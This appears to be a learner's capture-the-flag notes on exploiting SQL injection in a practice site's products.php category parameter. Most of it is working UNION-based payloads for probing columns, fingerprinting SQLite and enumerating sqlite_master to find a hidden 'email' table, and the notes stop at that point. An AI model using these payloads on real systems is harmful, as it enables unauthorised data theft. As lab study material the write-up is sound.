There was SQLi in:
```
GET /missions/realistic/4/products.php?category=1 HTTP/2
```
I tried:
```
1 union select 1 -- 
```
and got:
![[Pasted image 20260919143130.png]]
I tried:
```
1 union select 1,2,3,4 -- 
```
And it returned:
![[Pasted image 20260919143149.png]]
I also found out the table name was `products`. I tried unioning:
```
1,'a','b','c'
1,1.1,'a','b'
1,'a',1.1,'b'
1,'a','b',1.1
```
Which all gave empty images. 
I also tried with `information_schema` which also didn't work.
I found the following columns:
```
Table products
id - int
category - int
price - unknown
unknown - str ? # should be overview
```
It also filtered on the following symbol somehow:
```
>
```
However, this gave 0 results:
```sql
1 and 'a'='a>' -- 
```
And this gave all of them:
```sql
1 and 'a>'='a>' -- 
```
This was also not valid:
```sql
1 and ascii('a')=97; -- 
```
which means the ascii function isn't useful.
This is also doesnt compile:
```sql
1 and concat('a','b') = 'ab' --
```
I found that it is sqlite by trying the following payload which compiled:
```sql
2 and sqlite_version()= 'a' --
```
Using some code I tried all permutations of `int,int,float,string` and none of them returned something of value.
I also managed to find the last insert id:
```sql
2 and last_insert_rowid()=9 -- 
```
using order by `positional` on the select I found the order of the fields to be:
```
id, overview, price, category
```


The first:
```html
	 <tr>
		 <td>
		 <img src="1.jpg">
		 </td><td width=5>&nbsp;</td><td valign="top">
		 <font face="verdana">
		 A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered<br /><br /><b>$2550.00</b>
		 </font>
		 </td></tr>
```
I tried unioning the first one in the exact format:
```sql
1 UNION select 1,'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered',2550,1 -- 
1 UNION select 1,'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered',2550.00,1 -- 
1 UNION select 1,'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered','$2550.00',1 -- 
```
even further, this:
```sql
1 UNION select 1,'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered','$2550.00',1 -- 
```
Caused the query to return 3 elements instead of 4 which means this is the exact column in the database (it was not duplicated). 
Using the `sqlitemaster` table, I found that there was another one table apart from `products`:
```sql
0 union select 1,tbl_name,'',1 from sqlite_master where tbl_name != 'products' -- returned 1 row
```
I then started to look on how I can leak it.
However the hex function did not seem to work. 
I found the tbl_name was `email` 